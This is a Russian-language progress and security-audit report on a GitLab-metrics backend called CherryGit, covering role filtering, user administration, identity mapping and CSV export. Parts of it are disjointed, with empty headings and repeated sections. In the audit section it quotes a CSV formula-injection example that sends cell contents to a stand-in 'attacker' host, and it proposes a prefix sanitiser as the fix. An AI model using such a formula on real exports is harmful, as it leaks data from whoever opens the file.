- **TTL/downsampling** — за пределами MVP.
- **Снепшоты для индивидуальных метрик (`entityType='user'`)** — для дашборда разработчика. Сейчас writer пишет только `entityType='team'`. Расширение — `writeSnapshotsForUser(userUid, periodEnd)` с computeCycleTimeMr-per-user (нужно дополнительно фильтровать `authorUid` в WHERE). Это уже доработка под раздел 7.2 (личный дашборд) и 4.4 (резолв identity).
- **Unit-тесты** на writer/reader и `assertMetricAccessibleForRole` — задача 8.3.

### 3.2. Фильтрация ответов по роли — 🟢 90%

**Реализовано:**

- **`compute-team.ts` расширен `AuthorFilter`** ([compute-team.ts](back/src/modules/metrics/lib/compute-team.ts)) — `computeCycleTimeMr` и `computeMrSize` принимают опциональный `options.authorFilter: { userUid?, gitlabUsernames? }`. Условие в WHERE: `authorUid IN userUid OR authorGitlabUsername IN [...]`.

  - HEAD по-прежнему не видит CT MR/MR Size (review-метрики раскрывают паттерны лида).
- **`getTeamMetrics(actorUid, teamUid, periodStart, periodEnd)`** ([metrics.service.ts](back/src/modules/metrics/metrics.service.ts)) — реализован (был 501).

  - `accessMode` в ответе — UI знает, под какой ролью actor сейчас смотрит команду.
  - **`null` ≠ «нет данных»**: null = «у тебя нет права смотреть» (frontend показывает «недоступно»), пустой `value` (sampleSize=0) = «нет данных за период» (frontend показывает «нет данных»). Разделение критично для UX.

  - **`getCurrentUser(userUid)`** — расширенный профиль: базовые поля + role + departmentUid + список команд (с per-team role) + список GitLab-identities. `password` явно не селектится.

    - `baseline: { cycle_time_mr, mr_size }` — те же compute без filter.
    - **`gitlabUsernames` в ответе** — UI показывает «личные метрики посчитаны для аккаунтов: vasya, vp» (прозрачность).
  - **`getMyMetricsHistory`** — всё ещё заглушка (требует snapshot для `entityType='user'`, разблокировано через 2.7 — отдельный пункт).
- **`me.controller.ts`** — оживлён с валидацией ISO-дат периода (`NaN.getTime() → 400`).

**Что система ДЕЛАЕТ реально сейчас:**

- **DEVELOPER** заходит в дашборд → `GET /api/me/metrics?periodStart=...&periodEnd=...` → видит для каждой своей команды свой CT MR/MR Size рядом с командным baseline. Это «знаю, как я vs команда» без раскрытия чужих личных значений.

- **LEAD** видит все 6 метрик своей команды.

**Что НЕ раскрывается ни одной ролью:**

**Известные ограничения для текста ВКР:**

- **`bus_factor` доступен HEAD/member**: некоторые трактовки концепции «индивидуальные данные приватны от руководителя» могли бы запретить HEAD видеть список authors модуля. Но это публичный git-факт, не метрика. Не скрываем.
- **Personal-секция требует identity** для full coverage: для unresolved authors (нет записи в `user_gitlab_identities`) personal-метрики работают через fallback `gitlabUsernames` (только те, что у пользователя в identities). Если у DEVELOPER нет ни одной identity — его personal-секция всегда пустая (sampleSize=0). Это поведение корректное и подсвечивается через `gitlabUsernames: []` в ответе — UI показывает «привяжите GitLab-аккаунт, чтобы видеть свои метрики».
- **Personal Lead Time / DF / CFR / Bus Factor — НЕ возвращаются**: Lead Time per-author имеет слабый смысл (один MR → один автор, разница с baseline неинформативна для одного человека); DF/CFR — про релизы (не per-author); Bus Factor — про модули. Это согласуется с принципом «outcome важнее activity» — личные показатели заточены под review-process, не под throughput.
- **Тесты на 403** (часть исходной 3.1/3.2) — не написаны, это 8.3.

**Известные ограничения для текста ВКР:**

- **`departments.name` не уникальна** в БД — допустимы одноимённые отделы. Это design choice: «Backend» в продуктовых линиях A и B — нормальный случай. Если потребуется уникальность — добавить partial unique по `LOWER(name)` без потери совместимости со старыми данными.
- **Cascade-NULL при удалении** — не «деактивация» отдела, а полное удаление с обнулением FK. Альтернатива (soft-delete: `deletedAt` колонка) даст возможность «восстановить» отдел. Для MVP — намеренно простая семантика. История сохраняется в audit-log (`teamsDetached`, `usersUnassigned`).
- **Один HEAD ↔ один отдел**: модель `users.departmentUid` (одно поле) физически не позволяет HEAD'у быть руководителем сразу двух отделов. Концептуально согласовано (CherryGit — иерархия, не матричная структура). Если нужно — миграция на join-таблицу `department_heads`.
- **Один отдел ↔ много HEAD'ов**: `assignHead` нескольким разным пользователям подряд → у отдела может быть co-leadership (UI должен показывать всех). Это допускается concept'ом «руководители отдела» (`departmentsRelations.heads: many(users)`).
- **`setRoleToHead=false` — потенциальный leak**: если ADMIN привязал DEVELOPER к отделу через `assignHead(setRoleToHead:false)`, он получит `users.departmentUid=this`, но НЕ роль HEAD. На matrix это не влияет (DEVELOPER идёт в `assertTeamAccess` через `team_members`, departmentUid не используется). Но `getCurrentUser` отдаст ему `departmentUid` — UI может ошибочно показать «вы из отдела Backend». Это не security issue, а UX-нюанс — стоит документировать или добавить отдельное поле «role-scoping departmentUid».
- **Удаление отдела не отзывает уже посчитанные snapshots** — снепшоты содержат `teams.uid`, а не `departments.uid`. После cascade-NULL `teams.departmentUid` команды сохраняют свои snapshots — это правильное поведение (история не теряется).
- **Тесты на 403/404/409** — не написаны (это 8.3).

**Реализовано:**

  - `adminCreateUserSchema` (с опциональным `password` / autogen);
  - `adminUpdateUserSchema` — **НЕ позволяет** менять `role`/`password` (для них отдельные endpoints — design choice, см. ниже);
  - `changeRoleSchema` / `resetPasswordSchema` — отдельные узкие DTO;
  - `linkGitlabIdentitySchema` — `gitlabUserId` опционален (auto-resolve через GitLab API).
- **CRUD пользователей** ([users-admin.service.ts](back/src/modules/users-admin/users-admin.service.ts)) — `listUsers / getUser / createUser / updateUser / deleteUser`:
  - `listUsers` с фильтрами `role / departmentUid / search (ILIKE по firstName/secondName/mail) / limit (cap 500) / offset` через `parseListUsersFilter` (whitelist роли → 400 на невалид). Сортировка `secondName ASC, firstName ASC` — стабильный порядок UI. `password` НИКОГДА не селектится.
  - `getUser` — детально + teams (per-team role) + gitlabIdentities (с JOIN на gitlab_connections для отображения имени инстанса) + department, всё одним `Promise.all`.
  - `createUser` — если `password` не передан, генерируется криптостойкий временный (`crypto.randomBytes(12).toString('base64url')`, ~96 бит энтропии). Возвращается в ответе ОДИН РАЗ как `temporaryPassword` (admin копирует и сообщает out-of-band, в БД хранится только bcrypt-хеш). Audit фиксирует `passwordGenerated: true` БЕЗ самого значения. Уникальность email проверяется заранее SELECT'ом (даёт читабельный 409 вместо stack-trace на 23505).
  - `updateUser` — патч с no-op, защита от гонки SELECT/UPDATE (`.returning()` пустой → 404), обработка 23505 на mail/phone → 409. **НЕ позволяет менять role/password** — design choice #1 (см. шапку файла): audit-trail чётко отделяет «управление профилем» от «управления привилегиями».
  - `deleteUser` — с **тремя защитами от lockout'а**:
    1. **Suicide protection**: `actor === target` → 409 «нельзя удалить себя»;
    2. **Last-admin protection**: проверка `isLastAdmin(target)` → 409 «нельзя удалить последнего ADMIN'а»;
    3. **FK protection**: `gitlabConnections.ownerUid` — NOT NULL FK на users; если у юзера есть подключения → 409 с пояснением «передайте или удалите подключения сначала». Без этого FK violation выдаст stack-trace вместо понятного сообщения.
    - Каскадно (в одной транзакции) удаляются `team_members` + `user_gitlab_identities`; исторические `commits.authorUid` / `merge_requests.authorUid` / `mr_reviews.userUid` / `auditLogs.userUid` сохраняются с NULL — журнал и метрики не теряются.
    - После delete вызывается `removeAllTokensByUid` (force logout всех сессий).
- **Смена роли** — `changeRole(actor, uid, dto)`:
  - **No-op** при той же роли (без UPDATE, без audit, без invalidation).
  - **3 защиты**:
    1. `actor === target && newRole !== ADMIN` → 409 (нельзя понизить себя).
    2. `isLastAdmin(target) && newRole !== ADMIN` → 409 (нельзя снять ADMIN'а с последнего).
    3. `HEAD без departmentUid` — не блокируется, но в audit пишется флаг `headWithoutDepartment: true` (предупреждение: matrix-middleware всё равно не пустит HEAD'а без отдела до DORA-метрик — админ должен назначить отдел через `departments.assignHead`).
  - **Invalidation refresh-токенов**: после UPDATE — `removeAllTokensByUid(target)`. Access JWT с прежней ролью валиден до истечения (15 мин), после этого refresh не сработает и юзер залогинится повторно с новой ролью. Это **eventual consistency**: компромисс между мгновенной инвалидацией (требует JWT-blacklist в Redis на каждый запрос — overhead +1 Redis-GET per request) и UX (15 мин лаг — терпимо для админа).
  - Audit `user.role_changed` с `before/after/headWithoutDepartment`.
- **Сброс пароля** — `resetPassword(actor, uid, dto)`:
  - bcrypt(rounds=10), как в `auth.service` — единый параметр.
  - Force logout через `removeAllTokensByUid`.
  - **Audit `user.password_reset` БЕЗ plaintext-пароля** (никогда не пишем пароль в журнал — даже хеш бессмыслен в audit для бизнес-причины). Только флаг `tokensInvalidated: true`.
- **Связь с GitLab-аккаунтом** — `listUserIdentities / linkGitlabIdentity / unlinkGitlabIdentity`:
  - **Auto-resolve `gitlabUserId`** через `GitlabClient.fetchUserByUsername`: если DTO содержит только `gitlabUsername`, сервис расшифровывает PAT connection'а и зовёт `GET /api/v4/users?username=<u>`. Это даёт удобный UX — admin вводит только username, не лезет в GitLab UI за числовым ID.

Возвращает `null` для несуществующего username → 404 «пользователь GitLab не найден на этом инстансе» вместо 500-ки.
  - Если `gitlabUserId` передан — используется как есть (override; для случая когда GitLab username переименован, но ID известен).

**Известные ограничения для текста ВКР:**

- **Eventual consistency при changeRole/resetPassword**: до истечения access-JWT (default 15 мин) юзер сохраняет старые привилегии / может использовать старый пароль через старый JWT. ### 4.4. Маппинг GitLab-пользователей → CherryGit-пользователей — 🟢 90%

**Реализовано:**

- **Колонка `email` в `user_gitlab_identities`** ([schema.ts](back/src/db/drizzle/schema/gitlab/schema.ts)) — `text('email')` nullable. Email опционален (GitLab API `/users?username=` отдаёт email только при PAT'е с админ-правами; для обычного PAT'а identity сохранится без email — commit-резолв не сработает, но MR/review-резолв по username — работает). ⚠ Требуется миграция: `yarn generate && yarn migrate`.
- **`linkGitlabIdentity` подхватывает email из GitLab API** ([users-admin.service.ts](back/src/modules/users-admin/users-admin.service.ts)) — если в DTO `email` не передан, сервис расшифровывает PAT, зовёт `GitlabClient.fetchUserByUsername`, и берёт `gitlabUser.email` оттуда. Если GitLab вернул `null` (типично для обычного PAT'а) — identity сохраняется без email, audit фиксирует это в `emailResolvedFromGitlab: false`.
- **Двухуровневый commit-author resolver** ([sync.service.ts:resolveCommitAuthorsByEmail](back/src/modules/sync/sync.service.ts)):
  1. **Strong-match** через `user_gitlab_identities.email` (per-connection): админ задал email вручную или GitLab API его отдал. Это «крепкая» привязка — выживает между connection'ами без коллизий.
  2. **Implicit-match** через `users.mail` (cross-connection fallback): если `commit.author_email` совпадает с зарегистрированным `users.mail` — резолвим в этого пользователя БЕЗ создания identity. Это «авто-резолв при первом sync» из требования: разработчик, зарегистрированный с корпоративной почтой, сразу попадает в свои коммиты — админу НЕ нужно линковать каждого вручную.
- **`upsertCommits` теперь заполняет `commits.authorUid`** — на каждом sync через `ON CONFLICT DO UPDATE` переучитывается, что даёт корректное состояние после ручного `linkGitlabIdentity` БЕЗ полного resync. Bus Factor по авторам коммитов теперь группируется по `userUid` (а не по сырому email).
- **`backfillAuthorUidForIdentity`** ([users-admin.service.ts](back/src/modules/users-admin/users-admin.service.ts)) — fire-and-forget из `linkGitlabIdentity`: после создания identity бэк-резолвит ВСЕ исторические `commits.authorUid` (по email), `merge_requests.authorUid` (по username), `mr_reviews.reviewerUid` (по username) для проектов этого connection'а. Без этого Bus Factor / personal-metrics за прошлые периоды показывал бы `authorUid=null` до следующего полного resync. Scope ограничен `project.gitlabConnectionUid === connection`, чтобы username с одного GitLab не загрязнил данные другого.
- **`reconcileGitlabIdentities`** — bootstrap-endpoint `POST /admin/users/gitlab-identities/reconcile`:
  - Проходит всех `users` × все активные `gitlab_connections`;
  - Через `GitlabClient.searchUsers(user.mail)` ищет точное совпадение email на каждом GitLab-инстансе;
  - Создаёт identity для совпавших; вызывает `backfillAuthorUidForIdentity` для исторических данных;
  - Идемпотентен: уже привязанные юзеры (`uq_user_per_connection`) пропускаются;
  - Возвращает `{attempted, created, skipped, failed}` для UI-отчёта;
  - Audit `user.gitlab_identity.reconciled` с этой статистикой.
- **Новый метод `GitlabClient.searchUsers`** ([gitlab-client.service.ts](back/src/modules/gitlab/gitlab-client.service.ts)) — общая обёртка над `GET /users?search=<q>`, public API клиента (не приватный `paginate` через каст). Используется reconcile-endpoint'ом.
- **Сервис экспортирует email в `getUser` / `listUserIdentities`** + **`me.service` тоже** — UI на странице юзера показывает: для каждой identity видны username + email + connection. Это критично для отладки «почему commits не зарезолвлены» — админ сразу видит, есть ли у identity email.
- **Audit `user.gitlab_identity.linked`** расширен полями `email` и `emailResolvedFromGitlab` — admin видит, был ли email подхвачен из API или передан вручную.

**Что система ДЕЛАЕТ реально сейчас:**

- ADMIN регистрирует юзера через 4.3: `POST /admin/users {firstName, secondName, mail: "vasya@corp.ru"}` → юзер создан.
- При первом sync проекта commit с `author_email: "vasya@corp.ru"` → `resolveCommitAuthorsByEmail` находит совпадение в `users.mail` → `commits.authorUid = vasya.uid`. **Bus Factor по vasya работает сразу, без ручного линка.**
- ADMIN хочет «крепкую» привязку: `POST /admin/users/:vasya/gitlab-identities {gitlabConnectionUid: <X>, gitlabUsername: "vasya"}`. Сервис ходит в GitLab за `vasya`, получает `{id: 42, email: "vasya@corp.ru" or null}`. Identity сохраняется. `backfillAuthorUidForIdentity` бэк-резолвит исторические MR/reviews (commits уже зарезолвлены via implicit-match).
- Для bootstrap большой команды: `POST /admin/users/gitlab-identities/reconcile` → один запрос пытается auto-линкнуть всех. Возвращает `{attempted: 50, created: 31, skipped: 15, failed: 4}` — админ видит, кто не привязался (нужно вручную).

**Известные ограничения для текста ВКР:**

- **GitLab `search by email` требует admin PAT**: `searchUsers('vasya@corp.ru')` для обычного PAT'а вернёт пустой результат, потому что поле `email` в ответе отсутствует. На корпоративных GitLab-инстансах подключение делается обычно от админа — тогда reconcile работает. Для cloud GitLab (gitlab.com) этого не будет — admin'у придётся линковать вручную либо положиться на implicit-match через `users.mail`.
- **Implicit-match НЕ создаёт identity** — это сознательное решение: persist «слабой» identity с фейковым `gitlabUserId` ломает последующий ручной `linkGitlabIdentity` (uq_user_per_connection). Минус: между sync'ами implicit-match повторяется. Плюс: админ всегда может корректно сделать `linkGitlabIdentity` потом.
- **Один email ↔ много CherryGit-юзеров**: схема `users.mail unique` гарантирует one-to-one на стороне CherryGit. Если в GitLab разные люди ушли под одним email (старый аккаунт, новый аккаунт) — implicit-match привяжет ОБА commit'а к одному userUid (правильно: это один и тот же физический человек).
- **`backfillAuthorUidForIdentity` использует raw SQL для mr_reviews UPDATE с подзапросом** — drizzle не поддерживает subquery в WHERE одного UPDATE напрямую. Это нормальная практика для сложных UPDATE'ов, но повышает связанность с конкретным диалектом Postgres. При смене на другую БД — переписать через `db.update().from()` (драйвер-специфично).
- **Resolver делает SELECT всех users.mail** при implicit-match — для CherryGit-MVP (десятки-сотни юзеров) приемлемо. При росте до тысяч — оптимизировать через `lower(mail)` индекс + `inArray(lower(mail), unresolvedLowers)`.
- **Reconcile может быть медленным** на крупных GitLab-инстансах: для каждого CherryGit-юзера делается 1 запрос `searchUsers(mail)` → N юзеров × M connections запросов. Для 100 юзеров × 1 connection — 100 запросов, ~30 сек при rate-limit. Это ручная админ-операция, не cron — приемлемо.
- **Тесты на resolver** (strong-match vs implicit, кросс-connection корректность) — не написаны (это 8.3).

- **Зависимость `csv-stringify` подключена** (`yarn add csv-stringify`) — proven библиотека, корректно экранирует `"`, `\n`, `;` в значениях; используем sync-режим (`csv-stringify/sync`), потому что объём данных умеренный (десятки тысяч строк max) и stream-API избыточно.
- **CSV-writer хелпер** ([lib/csv-writer.ts](back/src/modules/export/lib/csv-writer.ts)) с UX-доработками для русскоязычного дашборда:
  - **UTF-8 BOM** в начале файла — без него Excel-RU открывает кириллицу как `Ð°Ð±Ð²Ð³...` (фоллбэк на cp1251). С BOM Excel автоматически переключается на UTF-8.
  - **Разделитель — `;`** по умолчанию (Excel-RU открывает CSV с `;` без диалога импорта). Параметр `separator` whitelist'нут (`;` или `,`) и доступен через `?separator=,` — для систем, ожидающих RFC 4180.
  - **CRLF** (`\r\n`) разделитель записей — стандарт CSV (Excel предпочитает).
  - **`null/undefined` → пустая строка**; `Date` → ISO-8601; `object/array` → `JSON.stringify` (для JSONB-полей audit/MR-details).
  - **`quoted_string: true`** — все строки в кавычках, защита от любого спецсимвола в данных.
  - **`csvFilename(prefix)`** — `prefix-YYYY-MM-DDTHH-MM-SS.csv` (без `:` — Windows не любит).
- **Zod DTOs** ([dto/export.dto.ts](back/src/modules/export/dto/export.dto.ts)) — 5 схем:
  - `periodExportQuerySchema` (periodStart/periodEnd + separator) — для team-metrics, team-merge-requests;
  - `departmentDoraQuerySchema` — расширяет period + granularity (`day`/`week`/`month`);
  - `teamParamsSchema`/`departmentParamsSchema` — UUID для path-параметров;
  - `auditExportQuerySchema` — фильтры audit (без cap'а на limit — экспорт большой).
  - Все используют `z.coerce.date()` для дат — поддерживают ISO и timestamp.
- **4 export-функции** ([export.service.ts](back/src/modules/export/export.service.ts)) — каждая с **ролевой проверкой и audit-записью**:

**Известные ограничения для текста ВКР:**

- **`team-metrics` long-формат + JSON в `value`-колонке**: Excel не парсит JSON автоматически — admin/аналитик должен открыть value-ячейку и руками распарсить (либо пропустить через Python pandas с `json.loads`). Wide-формат был бы удобнее, но дал бы 30+ колонок с null'ами для метрик, у которых другая структура (BF.modules — массив N модулей; в wide пришлось бы либо unnest'ить в отдельные строки, либо обрезать первые K модулей). Long+JSON — компромисс «всё в одном файле, в одном универсальном представлении».
- **`team-merge-requests` без list ревьюверов**: каждый MR — одна строка; список ревьюверов (mr_reviews) НЕ joined, иначе один MR с 3 ревьюверами дал бы 3 строки (denormalization). Если нужен — отдельный endpoint `exportTeamReviews` (не реализован в MVP). Для basic retro и Lead-Time-анализа MR-level хватает.
- **DORA-CSV без timeline**: `df.timeline` и `cfr.timeline` в выгрузке НЕ показываются — это массивы (по дням/неделям/месяцам), для wide-формата нужен `unnest`. Если HEAD'у нужна почасовая разбивка — выгружает per-team metrics CSV (long-формат, там timeline в JSON-value).
- **Discord/Excel формула-инъекция через `=SUM(...)` в username**: csv-stringify оборачивает строки в `"..."`, но Excel при импорте всё равно может попытаться evaluate выражение, начинающееся с `=`, `+`, `-`, `@`. **Защита не реализована в 6** — потенциальный CSV injection vector. Для MVP-демо допустимо (GitLab username не содержит `=`), для prod — добавить prefix `'` перед опасными значениями (`'=SUM(...)`).
- **`100к hard-cap` для audit-export**: при попадании в cap admin видит флаг `hitHardCap: true` в `export.csv.generated` details, но в самом файле никакого warning'а — может ошибочно думать, что выгрузил всё. UI должен показывать `X-Row-Count` header и предупреждать.
- **Нет streaming**: вся выгрузка собирается в Buffer в памяти. Для 100к audit-записей с большими JSON details — может быть ~100 MB heap. Streaming с `csv-stringify/stream` решит, но для MVP — не критично (admin'ские разовые выгрузки).
- **Separator default `;` не совпадает со стандартом RFC 4180** (запятая) — выбор в пользу Excel-RU UX. Для интеграции со сторонними системами (Tableau, Looker) — передавать `?separator=,`.
- **Тесты на export** (что 403 работает, что CSV корректно парсится назад) — не написаны (это 8.3).

**Что было:** `or(eq(users.mail, loginData.mail), eq(users.phone, loginData.phone))`. Если в `loginData.phone === null/undefined`, Drizzle превращает `eq(phone, null)` в SQL `phone IS NULL`, и OR-ветка цепляет ЛЮБОГО пользователя без телефона (типичный кейс — seed-админ). **Что было** ([main.ts](back/src/main.ts)): порядок middleware был `app.use('/api', router); app.use(securityHeaders);`. #### 9.1.5. ✅ FIXED — Error handlers вызывали `sendResponse` + `next()` одновременно

**Что было** ([main.ts](back/src/main.ts)): оба error-handler'а делали `next(); sendResponse(...)`. После `sendResponse` ответ отправлен; `next()` пытается передать управление следующему handler'у, тот тоже вызывает `sendResponse` → `Cannot set headers after they are sent to the client`. По факту прод-логи захламлены 500-ками поверх корректных 4xx.

**Фикс:** первый handler ловит `CustomError`-ы и отдаёт правильный statusCode; всё, что не CustomError — пробрасывается во второй (fallback 500). Никто не вызывает `next()` после `sendResponse`.

#### 9.2.17. CSV-injection через `=`/`+`/`-`/`@` prefix в экспорте

[export.service.ts](back/src/modules/export/export.service.ts) — csv-stringify корректно экранирует `;` `"` `\n` в значениях через quote-wrapping, но Excel при импорте всё равно может попытаться evaluate выражение, начинающееся с `=`, `+`, `-`, `@`. Если GitLab username, MR title или audit detail содержит `=SUM(...)` — Excel выполнит формулу при открытии CSV.

Для CherryGit это маловероятный вектор (GitLab username и labels не содержат `=`), но для prod-выгрузок с пользовательским контентом (commit messages, MR titles) — реальный риск exfiltration / phishing через формулу `=WEBSERVICE("http://attacker/?leak=" & A1)`.

**Доработать:** в `csv-writer.ts` добавить sanitize-prefix `'` перед любым значением, начинающимся с опасных символов (`=`, `+`, `-`, `@`, `\t`, `\r`) — стандартный OWASP CSV-injection guard. Не ломает обычные данные.

#### 9.2.20. `reconcileGitlabIdentities` может быть очень медленным

[users-admin.service.ts:reconcileGitlabIdentities](back/src/modules/users-admin/users-admin.service.ts) — для каждого `user × connection` делается отдельный `searchUsers(mail)` запрос в GitLab API. Для 100 юзеров × 1 connection — 100 API-запросов; на cloud GitLab с rate-limit'ом 600 req/min — ~10 секунд. Для 1000 юзеров × 3 connections — несколько минут блока в HTTP-запросе.

**Доработать варианты:**

1. **Batch search**: одним `GET /users?search=<mail1>&search=<mail2>` — GitLab API search не поддерживает множественные значения, увы.
2. **Background-task**: перевести в `setImmediate` / job queue, эндпоинт сразу возвращает `{taskUid}`, статус опрашивается через `/admin/tasks/:uid`.
3. **Pagination + early-exit**: брать сразу всех users одним SELECT'ом, делать поиск только по тем, у кого нет identity.

Текущий вариант (синхронно, sequentially) работает для MVP (~десятки юзеров), но не для прод.

#### 9.2.21. `req.ip` без `app.set('trust proxy', ...)` за прокси

[auth.service.ts:login](back/src/modules/auth/auth.service.ts), [ip-rate-limiter.ts](back/src/lib/ip-rate-limiter.ts) — `audit.failed_login` пишет `req.ip` для security-мониторинга, rate-limiter использует `req.ip` для блокировки атакующего IP. Express по умолчанию возвращает IP **transport-соединения**, что за прокси (nginx/cloudflare) даёт всегда `127.0.0.1` или адрес reverse-proxy.

**Последствия:**

- security-журнал бесполезен («все атаки с 127.0.0.1»);
- rate-limiter блокирует все логины при превышении лимита одним атакующим IP (false positive для всех остальных юзеров за тем же прокси).

**Доработать:** в `main.ts` добавить `app.set('trust proxy', 1)` (или `true` если за несколькими прокси), чтобы `req.ip` читался из `X-Forwarded-For`. Конфигурируемо через env `TRUST_PROXY_HOPS`.

#### 9.2.23. Snapshot и audit без retention/TTL — таблицы растут бесконечно

`metrics_snapshots`: 1 snapshot/день × 6 метрик × N команд → ~6N строк/день. Для 10 команд — 22к строк/год, ~30 MB. Для 100 команд — 220к строк/год, ~300 MB.

`audit_logs`: ~1k записей/день при активной системе → ~365k/год, ~150 MB JSONB.

Для MVP (горизонт защиты ВКР) не критично. Для прод-эксплуатации >1 года — нужен retention/downsampling:

- snapshots > 90 дней: downsample week → month;
- audit > 365 дней: DELETE или архив в S3.

**Доработать:** отдельный cron `cleanupOldData(ttlDays)` запускается раз в сутки. Конфигурируется через env `SNAPSHOT_TTL_DAYS=730`, `AUDIT_TTL_DAYS=365`.

**Итог обновлённого аудита:**

Бэкенд функционально готов end-to-end. Сценарий ВКР работает только через REST:

```
admin создаёт юзера → выдаёт роль → создаёт отдел → назначает HEAD →
создаёт команду → подключает GitLab → подключает проект → привязывает к команде →
линкует identity по email (или auto-link по users.mail) →
sync собирает commits/MR/deploys → snapshot писатель пишет 6 метрик/команду/день →
LEAD/HEAD дёргает /api/teams/:uid/metrics с ролевой фильтрацией →
DEV видит /me/metrics с personal+baseline →
любой пользователь выгружает CSV → каждое действие пишется в audit
```

**Архитектурные гарантии ВКР** (ролевая модель, приватность индивидуальных метрик, аудит) — **сохранены и enforced на уровне сервиса** (defence-in-depth: route-middleware + service-level `assertTeamAccess` + service-level `loadActorRole` + matrix-helper).
